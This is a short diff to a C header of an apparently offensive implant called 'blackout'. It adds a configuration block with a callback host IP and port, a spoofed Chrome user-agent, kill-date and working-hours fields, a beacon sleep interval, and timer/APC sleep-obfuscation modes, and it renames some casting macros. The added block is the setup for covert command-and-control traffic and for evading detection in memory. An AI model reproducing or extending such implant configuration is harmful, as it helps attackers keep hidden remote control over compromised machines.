@@ -2,6 +2,23 @@
 #define BLACKOUT_MACROS_H
 
 //
+// blackout config
+//
+#define CONFIG_HOST       L"172.25.31.176"
+#define CONFIG_PORT       803
+#define CONFIG_USERAGENT  L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
+#define CONFIG_SECURE     FALSE
+#define CONFIG_WRKHRS     NULL
+#define CONFIG_KILLDATE   NULL
+#define CONFIG_SLEEP      8
+
+#ifndef _BK_SLEEP_OBF_
+#define _BK_SLEEP_OBF_ 0  
+#endif
+#define _BK_SLEEP_TIMER_   0x1030
+#define _BK_SLEEP_APC_     0x2030
+
+//
 // Hashing defines
 //
 
@@ -46,10 +63,10 @@
 #define C_16( x )  ( ( INT16 )  ( x ) )
 #define C_32( x )  ( ( INT32 )  ( x ) )
 #define C_64( x )  ( ( INT64 )  ( x ) )
-#define C_U8( x )  ( ( UINT8 )  ( x ) )
-#define C_U16( x ) ( ( UINT16 ) ( x ) )
-#define C_U32( x ) ( ( UINT32 ) ( x ) )
-#define C_U64( x ) ( ( UINT64 ) ( x ) )
+#define U_8( x )  ( ( UINT8 )  ( x ) )
+#define U_16( x ) ( ( UINT16 ) ( x ) )
+#define U_32( x ) ( ( UINT32 ) ( x ) )
+#define U_64( x ) ( ( UINT64 ) ( x ) )
 
 //
 // casting macros
